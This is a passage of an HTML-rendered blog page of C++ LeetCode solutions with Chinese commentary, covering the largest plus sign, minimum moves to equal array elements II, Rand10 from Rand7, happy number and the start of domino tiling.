class="built_in">min</span>(dp[j][i], up);</span><br><span class="line">                dp[k][i] = <span class="built_in">min</span>(dp[k][i], down);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : dp) ans = <span class="built_in">max</span>(ans, *<span class="built_in">max_element</span>(e.<span class="built_in">begin</span>(), e.<span class="built_in">end</span>()));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å…¶å®ä»”ç»†ä¸€çœ‹ï¼Œå’Œæˆ‘æ˜¯ä¸€æ ·çš„ï¼Œä¸€ä¸ªä¸€ç»´forä¸¤ä¸ªäºŒç»´forï¼Œä½†æ˜¯å¾ˆçŸ­<br>dpå­˜çš„æ˜¯åˆ°æœ€è¿‘çš„ä¸€ä¸ª0çš„é•¿åº¦</p></blockquote><h3 id="ä¼˜åŒ–ç©ºé—´"><a href="#ä¼˜åŒ–ç©ºé—´" class="headerlink" title="ä¼˜åŒ–ç©ºé—´"></a>ä¼˜åŒ–ç©ºé—´</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orderOfLargestPlusSign</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mines)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mat</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, n));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> mine : mines) mat[mine[<span class="number">0</span>]][mine[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> l = <span class="number">-1</span>,r = n,u = <span class="number">-1</span>,d = n;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>, k = n<span class="number">-1</span>; j &lt; n; j++, k--) &#123;</span><br><span class="line">                l = mat[i][j] ? l : j;</span><br><span class="line">                u = mat[j][i] ? u : j;</span><br><span class="line">                r = mat[i][k] ? r : k;</span><br><span class="line">                d = mat[k][i] ? d : k;</span><br><span class="line">                mat[i][j] = <span class="built_in">min</span>(mat[i][j], j - l);</span><br><span class="line">                mat[j][i] = <span class="built_in">min</span>(mat[j][i], j - u);</span><br><span class="line">                mat[i][k] = <span class="built_in">min</span>(mat[i][k], r - k);</span><br><span class="line">                mat[k][i] = <span class="built_in">min</span>(mat[k][i], d - k);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> maxx = INT_MIN;</span><br><span class="line">        <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;&amp; vec : mat) maxx = <span class="built_in">max</span>(maxx, *<span class="built_in">max_element</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>()));</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒå¤§ä½¬çš„æ–¹æ³•ï¼ŒæŠŠæˆ‘çš„æ€è·¯ä¼˜åŒ–æˆåªç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„<br>è¿™é‡Œè¦æ³¨æ„matåˆå§‹åŒ–ä¸ºnï¼Œå¦‚æœåˆå§‹åŒ–ä¸º1çš„è¯åé¢æ²¡åŠæ³•æ‰¾æœ€å°å€¼ã€‚</p></blockquote><h2 id="462-æœ€å°æ“ä½œæ¬¡æ•°ä½¿æ•°ç»„å…ƒç´ ç›¸ç­‰-II"><a href="#462-æœ€å°æ“ä½œæ¬¡æ•°ä½¿æ•°ç»„å…ƒç´ ç›¸ç­‰-II" class="headerlink" title="462. æœ€å°æ“ä½œæ¬¡æ•°ä½¿æ•°ç»„å…ƒç´ ç›¸ç­‰ II"></a><a href="https://leetcode.cn/problems/minimum-moves-to-equal-array-elements-ii/">462. æœ€å°æ“ä½œæ¬¡æ•°ä½¿æ•°ç»„å…ƒç´ ç›¸ç­‰ II</a></h2><h3 id="å‰ç¼€å’Œ-1"><a href="#å‰ç¼€å’Œ-1" class="headerlink" title="å‰ç¼€å’Œ"></a>å‰ç¼€å’Œ</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> minn = INT_MAX;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preSum</span><span class="params">(len, <span class="number">0</span>)</span></span>;</span><br><span class="line">        preSum[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            preSum[i] = preSum[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            minn = <span class="built_in">min</span>(minn, (i+<span class="number">1</span>)*nums[i] - preSum[i] + preSum[len<span class="number">-1</span>] - preSum[i] - (len-i <span class="number">-1</span>)*nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å…ˆæ’åºï¼Œå‡è®¾ç¬¬iä¸ªæ•°æ˜¯èƒ½ä½¿æ€»ä½“è°ƒæ•´æ•°æœ€å°çš„æ•°ï¼Œé‚£ä¹ˆæ€»çš„è°ƒæ•´æ¬¡æ•°ä¸º<br>$$ i \times nums_i - \sum_{ j&#x3D;0 }^{ j&#x3D;i-1 }(nums_i) + \sum_{ j&#x3D;i+1 }^{ j&#x3D;n-1 }(nums_j) - (n - i -1) \times nums_i $$<br>$$ i &#x3D; 0,1,â€¦,n-1 $$<br>å¹¶ä½¿ç”¨å‰ç¼€å’Œä¼˜åŒ–<br>æ‰¾ä»–çš„æœ€å°å€¼å³å¯</p></blockquote><h3 id="æ•°å­¦æ–¹æ³•"><a href="#æ•°å­¦æ–¹æ³•" class="headerlink" title="æ•°å­¦æ–¹æ³•"></a>æ•°å­¦æ–¹æ³•</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[len/<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ’åºåï¼Œä¸­ä½æ•°ä¹‹ä¸€åˆšå¥½å°±æ˜¯æ‰€æ±‚å…ƒç´ <br>å‡è®¾ $ a_i a_j; i+j&#x3D;len-1 $ ä¸ºä¸¤ä¸ªå¾…è°ƒæ•´å…ƒç´ <br>$ h $ ä¸ºæœ€ç»ˆè°ƒæ•´åçš„æ•°ï¼Œé‚£ä¹ˆ $$ h &#x3D; a_j - d_j  &#x3D; d_i - a_i $$<br>ä¹Ÿå°±æ˜¯ $$ a_j - a_i &#x3D; d_j + d_i $$<br>å¯¹äºå…³äºä¸­å¿ƒå¯¹ç§°çš„æ•°ï¼Œä¸ç®¡è¦è°ƒæ•´æˆä»–ä»¬ä¸­é—´çš„å“ªä¸€ä¸ªæ•°ï¼Œè°ƒæ•´çš„æ­¥æ•°ä¹‹å’Œæ€»æ˜¯ $ a_j - a_i $</p></blockquote><ul><li>æ‰€ä»¥æ ¹æœ¬ä¸éœ€è¦çŸ¥é“æœ€ç»ˆè°ƒæ•´æˆå“ªä¸ªæ•°ï¼Œåªè¦è®¡ç®—å¯¹ç§°ä½ç½®çš„ä¸¤ä¸ªæ•°çš„å·®å€¼ä¹‹å’Œå³å¯</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++) &#123;</span><br><span class="line">            sum += nums[len<span class="number">-1</span>-i] - nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ä¸æ’åºæ‰¾åˆ°ç¬¬len-x2F-2å°çš„æ•°"><a href="#ä¸æ’åºæ‰¾åˆ°ç¬¬len-x2F-2å°çš„æ•°" class="headerlink" title="ä¸æ’åºæ‰¾åˆ°ç¬¬len&#x2F;2å°çš„æ•°"></a>ä¸æ’åºæ‰¾åˆ°ç¬¬len&#x2F;2å°çš„æ•°</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">nth_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">begin</span>() + len/<span class="number">2</span>, nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[len/<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>è‡ªå·±å®ç°partition</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = len;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">            k = <span class="built_in">partition</span>(nums, i ,j);</span><br><span class="line">            <span class="keyword">if</span>(k == len/<span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k &gt; len/<span class="number">2</span>) &#123;</span><br><span class="line">                j = k;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = k+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[k]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> target = i;</span><br><span class="line">        j--;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[j] &gt;= nums[target]) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[j] &lt; nums[target])<span class="built_in">swap</span>(nums[target], nums[j]);</span><br><span class="line">            target = j;</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[i] &lt;= nums[target]) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; nums[target])<span class="built_in">swap</span>(nums[target], nums[i]);</span><br><span class="line">            target = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¤ªæ…¢äº†ã€‚ã€‚ã€‚</p><ul><li>å»æ‰swap</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = len<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">            k = <span class="built_in">partition</span>(nums, i, j);</span><br><span class="line">            <span class="keyword">if</span>(k == len/<span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k &gt; len/<span class="number">2</span>) &#123;</span><br><span class="line">                j = k<span class="number">-1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = k+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += <span class="built_in">abs</span>(nums[i] - nums[k]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> pivot = nums[i];</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[j] &gt;= pivot) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[i] = nums[j];</span><br><span class="line">            <span class="keyword">while</span>(j &gt; i &amp;&amp; nums[i] &lt;= pivot) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[j] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[i] = pivot;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="470-ç”¨-Rand7-å®ç°-Rand10"><a href="#470-ç”¨-Rand7-å®ç°-Rand10" class="headerlink" title="470. ç”¨ Rand7() å®ç° Rand10()"></a><a href="https://leetcode.cn/problems/implement-rand10-using-rand7/">470. ç”¨ Rand7() å®ç° Rand10()</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rand10</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%<span class="number">10</span>+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ»¡èº«åéª¨</p></blockquote><h2 id="202-å¿«ä¹æ•°"><a href="#202-å¿«ä¹æ•°" class="headerlink" title="202. å¿«ä¹æ•°"></a><a href="https://leetcode.cn/problems/happy-number/">202. å¿«ä¹æ•°</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">1</span>) &#123;</span><br><span class="line">            n = <span class="built_in">next</span>(n);</span><br><span class="line">            <span class="keyword">if</span>(n == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            sum += (n%<span class="number">10</span>)*(n%<span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å¤§å®¶éƒ½æœ‰ç›¸åŒçš„å¾ªç¯èŠ‚</p></blockquote><h3 id="å¿«æ…¢æŒ‡é’ˆ"><a href="#å¿«æ…¢æŒ‡é’ˆ" class="headerlink" title="å¿«æ…¢æŒ‡é’ˆ"></a>å¿«æ…¢æŒ‡é’ˆ</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nn = n;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            n = <span class="built_in">next</span>(n);</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">            <span class="keyword">if</span>(nn == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">            <span class="keyword">if</span>(nn == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(n != nn);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            sum += (n%<span class="number">10</span>)*(n%<span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isHappy</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> nn = n;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            n = <span class="built_in">next</span>(n);</span><br><span class="line">            <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">            nn = <span class="built_in">next</span>(nn);</span><br><span class="line">        &#125; <span class="keyword">while</span>(n != nn);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            sum += (n%<span class="number">10</span>)*(n%<span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="790-å¤šç±³è¯ºå’Œæ‰˜ç±³è¯ºå¹³é“º"><a href="#790-å¤šç±³è¯ºå’Œæ‰˜ç±³è¯ºå¹³é“º" class="headerlink" title="790. å¤šç±³è¯ºå’Œæ‰˜ç±³è¯ºå¹³é“º"></a>790. å¤šç±³è¯ºå’Œæ‰˜ç±³è¯ºå¹³é“º</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span 